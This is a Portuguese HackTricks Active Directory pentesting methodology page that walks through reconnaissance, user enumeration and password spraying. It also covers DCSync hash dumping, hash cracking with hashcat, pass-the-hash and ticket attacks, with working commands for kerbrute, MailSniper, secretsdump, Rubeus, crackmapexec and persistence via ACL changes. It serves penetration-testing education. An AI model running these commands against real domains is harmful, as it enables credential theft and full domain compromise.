# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

**Active Directory** serve como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem de forma eficiente **domínios**, **usuários** e **objetos** dentro de uma rede. Foi projetado para escalar, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla os **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **trees**, e **forests**. Um **domain** engloba uma coleção de objetos, como **usuários** ou **dispositivos**, que compartilham um banco de dados comum. **Trees** são grupos desses domínios ligados por uma estrutura compartilhada, e uma **forest** representa a coleção de múltiplas trees, interconectadas através de **trust relationships**, formando a camada mais alta da estrutura organizacional. Direitos específicos de **acesso** e **comunicação** podem ser designados em cada um desses níveis.

Conceitos-chave dentro do **Active Directory** incluem:

1. **Directory** – Abriga todas as informações referentes aos objetos do Active Directory.
2. **Object** – Denota entidades dentro do directory, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domain** – Serve como um contêiner para objetos do directory, com a capacidade de múltiplos domains coexistirem dentro de uma **forest**, cada um mantendo sua própria coleção de objetos.
4. **Tree** – Um agrupamento de domains que compartilham um domain root comum.
5. **Forest** – O topo da estrutura organizacional no Active Directory, composto por várias trees com **trust relationships** entre elas.

**Active Directory Domain Services (AD DS)** abrange uma gama de serviços críticos para o gerenciamento centralizado e comunicação dentro de uma rede. Esses serviços incluem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia interações entre **usuários** e **domínios**, incluindo **autenticação** e funcionalidades de **search**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **certificados digitais** seguros.
3. **Lightweight Directory Services** – Suporta aplicações habilitadas para directory através do **LDAP protocol**.
4. **Directory Federation Services** – Fornece capacidades de **single-sign-on** para autenticar usuários em múltiplas aplicações web em uma única sessão.
5. **Rights Management** – Ajuda a proteger material com direitos autorais regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Crucial para a resolução de **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender como **atacar um AD** você precisa entender muito bem o processo de **autenticação Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Você pode acessar [https://wadcoms.github.io/](https://wadcoms.github.io) para ter uma visão rápida dos comandos que pode executar para enumerar/explorar um AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** para realizar ações. Se você tentar acessar uma máquina pelo endereço IP, **ele usará NTLM e não Kerberos**.

## Recon Active Directory (No creds/sessions)

Se você tem acesso a um ambiente AD mas não possui credenciais/sessões, você pode:

- **Pentest the network:**
- Escanear a rede, localizar máquinas e portas abertas e tentar **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [impressoras podem ser alvos muito interessantes](ad-information-in-printers.md)).
- A enumeração de DNS pode fornecer informações sobre servidores chave no domínio, como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Veja a página geral da [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar mais informações sobre como fazer isso.
- **Check for null and Guest access on smb services** (isso não funciona nas versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Coletar credenciais **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar hosts abusando do [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credenciais **expondo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair usernames/nomes de documentos internos, redes sociais, serviços (principalmente web) dentro dos ambientes do domínio e também os disponíveis publicamente.
- Se você encontrar os nomes completos dos colaboradores da empresa, pode tentar diferentes convenções de username do AD (**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
- Ferramentas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Anonymous SMB/LDAP enum:** Consulte as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando um **username inválido é solicitado**, o servidor responderá com o código de erro do **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o username é inválido. **Usernames válidos** provocarão ou o **TGT em um AS-REP** ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário é obrigado a realizar pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra a interface MS-NRPC (Netlogon) em domain controllers. O método chama a função `DsrGetDcNameEx2` após bind da interface MS-NRPC para verificar se o usuário ou computador existe sem qualquer credencial. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [aqui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se você encontrar um desses servidores na rede, também pode realizar **user enumeration** contra ele. Por exemplo, você pode usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de usernames em [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Conhecendo um ou vários usernames

Ok, então você já sabe que tem um username válido mas sem passwords... Então tente:

- [**ASREPRoast**](asreproast.md): Se um user **não tem** o atributo _DONT_REQ_PREAUTH_ você pode **request a AS_REP message** para esse user que conterá alguns dados criptografados por uma derivação da password do user.
- [**Password Spraying**](password-spraying.md): Vamos tentar as **most common passwords** com cada um dos discovered users, talvez algum user esteja usando uma bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode ser capaz de **obter** alguns challenge **hashes** para crackar ao **poisoning** alguns protocolos da **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o active directory terá **more emails and a better understanding of the network**. Você pode ser capaz de forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obter acesso ao AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** para manter o AD recon state por engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando **SMB relay to the DC is blocked** por signing, ainda verifique a postura do **LDAP**: `netexec ldap <dc>` evidencia `(signing:None)` / weak channel binding. Um DC com SMB signing exigido mas LDAP signing desabilitado continua sendo um alvo viável de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Client-side printer credential leaks → validação em massa de credenciais do domínio

- As UIs de impressora/web às vezes **embedam senhas de admin mascaradas no HTML**. Ver o source/devtools pode revelar o cleartext (por exemplo, `<input value="<password>">`), permitindo acesso Basic-auth a repositórios de digitalizações/impressões.
- Trabalhos de impressão recuperados podem conter **documentos de onboarding em plaintext** com senhas por usuário. Mantenha os pareamentos alinhados ao testar:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Roubar NTLM Creds

Se você puder **access other PCs or shares** com o **null or guest user** você pode **place files** (como um SCF file) que, se de alguma forma acessados, irão t**rigger an NTLM authentication against you** para que você possa **steal** o **NTLM challenge** e crackeá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada NT hash que você já possui como uma senha candidata para outros formatos mais lentos cujo material de chave é derivado diretamente do NT hash. Em vez de brute-forçar passphrases longas em tickets Kerberos RC4, respostas NetNTLM, ou credenciais em cache, você injeta os NT hashes nos modos NT-candidate do Hashcat e deixa-o validar o reuso de senhas sem nunca aprender o plaintext. Isso é especialmente potente após um compromisso de domínio onde você pode coletar milhares de NT hashes atuais e históricos.

Use shucking quando:

- Você tem um corpus NT vindo de DCSync, dumps SAM/SECURITY, ou vaults de credenciais e precisa testar reuso em outros domínios/florestas.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM, ou blobs DCC/DCC2.
- Você quer provar rapidamente reuso para passphrases longas e inquebráveis e pivotar imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de encriptação cujas chaves não são o NT hash (ex.: Kerberos etype 17/18 AES). Se um domínio aplica apenas AES, você deve voltar aos modos regulares de senha.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` com history para pegar o maior conjunto possível de NT hashes (e seus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Entradas de history ampliam dramaticamente o pool de candidatos porque a Microsoft pode armazenar até 24 hashes anteriores por conta. Para mais formas de colher segredos do NTDS veja:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais SAM/SECURITY e logons de domínio em cache (DCC/DCC2). Desduplique e anexe esses hashes ao mesmo arquivo `nt_candidates.txt`.
- **Track metadata** – Mantenha o username/domain que produziu cada hash (mesmo se o wordlist contiver apenas hex). Hashes que casam dizem imediatamente qual principal está reutilizando uma senha assim que o Hashcat imprimir o candidato vencedor.
- Prefira candidatos da mesma forest ou de uma forest confiável; isso maximiza a chance de overlap ao shuckar.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Desative engines de regras (sem `-r`, sem modos híbridos) porque mangling corrompe o material de chave candidato.
- Esses modos não são intrinsecamente mais rápidos, mas o keyspace NTLM (~30,000 MH/s em um M3 Max) é ~100× mais rápido que Kerberos RC4 (~300 MH/s). Testar uma lista NT selecionada é muito mais barato do que explorar todo o espaço de senhas no formato lento.
- Sempre rode o **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) porque os modos 31500/31600/35300/35400 foram lançados recentemente.
- Atualmente não existe um modo NT para AS-REQ Pre-Auth, e os etypes AES (19600/19700) requerem a senha em plaintext porque suas chaves são derivadas via PBKDF2 de senhas em UTF-16LE, não de NT hashes brutos.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture um TGS RC4 para um SPN alvo com um usuário de baixo privilégio (veja a página Kerberoast para detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck o ticket com sua lista de NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva a chave RC4 de cada candidato NT e valida o blob `$krb5tgs$23$...`. Um match confirma que a conta de serviço usa um dos seus NT hashes existentes.

3. Pivot imediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Você pode opcionalmente recuperar o plaintext depois com `hashcat -m 1000 <matched_hash> wordlists/` se necessário.

#### Example – Cached credentials (mode 31600)

1. Faça dump dos logons em cache de uma workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copie a linha DCC2 do usuário de domínio interessante para `dcc2_highpriv.txt` e shucke-a:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Um match bem-sucedido retorna o NT hash já conhecido na sua lista, provando que o usuário em cache está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-force em modo NTLM rápido para recuperar a string.

O mesmo fluxo exato aplica-se a respostas NetNTLM (`-m 27000/27100`) e DCC (`-m 31500`). Uma vez identificado um match, você pode lançar relay, SMB/WMI/WinRM PtH, ou re-crackear o NT hash com masks/rules offline.



## Enumerando Active Directory WITH credentials/session

Para esta fase você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tem algumas credenciais válidas ou um shell como um usuário de domínio, **lembre-se que as opções dadas antes ainda são opções para comprometer outros usuários**.

Antes de começar a enumeração autenticada você deve saber qual é o **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domínio**, porque você poderá iniciar a **Active Directory Enumeration:**

Em relação ao [**ASREPRoast**](asreproast.md) você agora pode encontrar todo usuário vulnerável possível, e em relação ao [**Password Spraying**](password-spraying.md) você pode obter uma **lista de todos os usernames** e tentar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also use [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

É muito fácil obter todos os usernames do domínio no Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção Enumeration pareça pequena, esta é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda a enumerar um domínio e pratique até se sentir confortável. Durante uma avaliação, este será o momento chave para encontrar seu caminho até DA ou decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **TGS tickets** usados por serviços ligados a contas de usuário e crackear sua encriptação — que é baseada nas senhas dos usuários — **offline**.

Mais sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Uma vez que você tenha obtido algumas credenciais você pode verificar se tem acesso a alguma **machine**. Para isso, você pode usar **CrackMapExec** para tentar conectar em vários servidores com diferentes protocolos, de acordo com seus scans de portas.

### Escalada de Privilégios Local

Se você comprometeu credenciais ou uma sessão como um usuário de domínio comum e tem **access** com esse usuário a **qualquer máquina no domínio** você deve tentar encontrar um caminho para **escalar privilégios localmente e saquear por credenciais**. Isso porque somente com privilégios de administrador local você será capaz de **dump hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e uma [**checklist**](../checklist-windows-privilege-escalation.md). Também, não esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

É muito **unlikely** que você encontre **tickets** no usuário atual **giving you permission to access** recursos inesperados, mas você pode checar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o active directory, terá **mais e-mails e uma melhor compreensão da rede**. Você pode conseguir forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** quaisquer **arquivos interessantes sendo compartilhados dentro do AD**. Você pode fazer isso manualmente, mas é uma tarefa muito chata e repetitiva (ainda mais se encontrar centenas de documentos para checar).

[**Siga este link para conhecer ferramentas que você pode usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se você puder **acessar outros PCs ou shares** poderia **colocar arquivos** (como um SCF file) que, se de alguma forma acessados, irão **disparar uma NTLM authentication contra você** para que você possa **roubar** o **NTLM challenge** para cracká-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para as técnicas seguintes um usuário de domínio comum não é suficiente; você precisa de privilégios/credenciais especiais para executar esses ataques.**

### Hash extraction

Esperançosamente você conseguiu **comprometer alguma conta local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Então, é hora de dump de todos os hashes na memória e localmente.\
[**Leia esta página sobre diferentes maneiras de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Uma vez que você tem o hash de um usuário**, você pode usá-lo para **se passar por ele**.\
Você precisa usar alguma **ferramenta** que irá **realizar a NTLM authentication usando** esse **hash**, **ou** você pode criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, de forma que, quando qualquer **NTLM authentication for realizada**, esse **hash será usado.** A última opção é o que o mimikatz faz.\
[**Leia esta página para mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tem como objetivo **usar o NTLM hash do usuário para requisitar tickets Kerberos**, como alternativa ao comum Pass The Hash sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes onde o protocolo NTLM está desabilitado** e apenas **Kerberos é permitido** como protocolo de autenticação.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez de sua senha ou valores de hash. Esse ticket roubado é então usado para **se passar pelo usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se você tem o **hash** ou a **password** de um **administrador local**, você deve tentar **login locally** em outros **PCs** com ele.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note que isto é bastante **ruidoso** e o **LAPS** o **mitigaria**.

### Abuso de MSSQL & Links Confiáveis

Se um usuário tem privilégios para **acessar instâncias MSSQL**, ele pode usá-las para **executar comandos** no host MSSQL (se estiver a correr como SA), **roubar** o NetNTLM **hash** ou mesmo realizar um **relay** **attack**.\
Além disso, se uma instância MSSQL for confiável (database link) por uma instância MSSQL diferente, se o usuário tiver privilégios sobre a base de dados confiável, ele poderá **usar a relação de confiança para executar queries também na outra instância**. Essas trusts podem ser encadeadas e em algum ponto o usuário pode conseguir encontrar uma base de dados mal configurada onde possa executar comandos.\
**Os links entre bases de dados funcionam mesmo através de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de inventário/implantação de TI

Suites de inventário e deployment de terceiros frequentemente expõem caminhos poderosos para credenciais e execução de código. Veja:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e você tiver privilégios de domínio naquela máquina, será possível dumpar TGTs da memória de todos os usuários que fizerem login na máquina.\
Portanto, se um **Domain Admin** fizer login na máquina, você conseguirá dumpar o seu TGT e impersoná-lo usando [Pass the Ticket](pass-the-ticket.md).\
Graças ao constrained delegation você poderia até **comprometer automaticamente um Print Server** (esperançosamente será um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador estiver autorizado para "Constrained Delegation" ele poderá **impersonar qualquer usuário para acessar certos serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, será capaz de **impersonar qualquer usuário** (até domain admins) para acessar alguns serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ter privilégio de **WRITE** sobre um objeto do Active Directory de um computador remoto permite obter execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de Permissões/ACLs

O usuário comprometido pode ter alguns **privilégios interessantes sobre certos objetos de domínio** que poderiam permitir que você **mova-se** lateralmente/**escalone** privilégios mais tarde.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso do serviço Printer Spooler

Descobrir um **serviço Spool escutando** dentro do domínio pode ser **abusado** para **obter novas credenciais** e **escalar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sessões de terceiros

Se **outros usuários** **acessarem** a máquina **comprometida**, é possível **capturar credenciais da memória** e até **injetar beacons nos processos deles** para se passar por eles.\
Normalmente os usuários acessam o sistema via RDP, então aqui está como realizar alguns ataques sobre sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornece um sistema para gerir a **senha do Administrador local** em computadores associados ao domínio, garantindo que ela seja **randomizada**, única e frequentemente **alterada**. Essas senhas são armazenadas no Active Directory e o acesso é controlado por ACLs apenas para usuários autorizados. Com permissões suficientes para acessar essas senhas, pivotar para outros computadores torna-se possível.


{{#ref}}
laps.md
{{#endref}}

### Roubo de Certificados

**Coletar certificados** da máquina comprometida pode ser uma forma de escalar privilégios dentro do ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de Certificate Templates

Se **templates vulneráveis** estiverem configurados, é possível abusá-los para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Pós-exploração com conta de alto privilégio

### Extração de credenciais do domínio

Uma vez que você obtenha privilégios de **Domain Admin** ou, ainda melhor, **Enterprise Admin**, você pode **extrair** o **banco de dados do domínio**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algumas das técnicas discutidas anteriormente podem ser usadas para persistência.\
Por exemplo, você poderia:

- Tornar usuários vulneráveis ao [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Tornar usuários vulneráveis ao [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilégios de [**DCSync**](#dcsync) a um usuário

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O **Silver Ticket attack** cria um ticket legítimo do Ticket Granting Service (TGS) para um serviço específico usando o **NTLM hash** (por exemplo, o **hash da conta do PC**). Esse método é empregado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **Golden Ticket attack** envolve um atacante obtendo acesso ao **NTLM hash da conta krbtgt** em um ambiente Active Directory (AD). Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, essenciais para autenticação na rede AD.

Uma vez que o atacante obtém esse hash, ele pode criar **TGTs** para qualquer conta que escolher (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Esses são como golden tickets forjados de uma forma que **contorna os mecanismos comuns de detecção de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistência de Conta via Certificados**

**Ter certificados de uma conta ou ser capaz de solicitá-los** é uma ótima forma de persistir na conta do usuário (mesmo que ele mude a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistência de Domínio via Certificados**

**Usar certificados também permite persistir com privilégios elevados dentro do domínio:**


{{#ref}}
